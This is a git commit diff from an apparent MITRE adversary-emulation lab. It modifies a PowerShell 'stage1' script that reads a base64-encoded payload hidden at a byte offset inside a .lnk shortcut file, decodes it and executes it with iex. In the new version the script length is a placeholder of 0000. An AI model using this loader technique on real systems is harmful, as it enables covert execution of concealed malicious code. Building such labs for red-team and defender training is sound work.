45338a9f5d011b0d0123aff4ad462dcc76bde45e
Govardhen Arunagiri <garunagiri@mitre.org>
2021-06-18 12:41:35 -0400

    modifications to stage1 command

--- labs/lab1/stage1_command.ps1
+++ labs/lab1/stage1_command.ps1
@@ -1,5 +1,5 @@
 $script_start_byte = 0x0005e2be
-$script_end_byte = 0x0005edee
+$script_length = 0000;
 $filename = "ds7002.lnk"
 
 if (-not(Test-Path $filename))
@@ -12,9 +12,9 @@ exit
 [IO.Directory]::SetCurrentDirectory($val.DirectoryName);
 }
 $filestream = New-Object IO.FileStream $filename,'Open','Read','ReadWrite';
-$val = New-Object byte[]($script_end_byte - $script_start_byte);
-$r = $filestream.Seek($ptgt,[IO.SeekOrigin]::Begin);
-$r = $filestream.Read($val,0,$vcq-$ptgt);
+$val = New-Object byte[]($script_length);
+$r = $filestream.Seek($script_start_byte,[IO.SeekOrigin]::Begin);
+$r = $filestream.Read($val,0,$script_length);
 $val = [Convert]::FromBase64CharArray($val,0,$val.Length);
 $string = [Text.Encoding]::ASCII.GetString($val);
 iex $string;
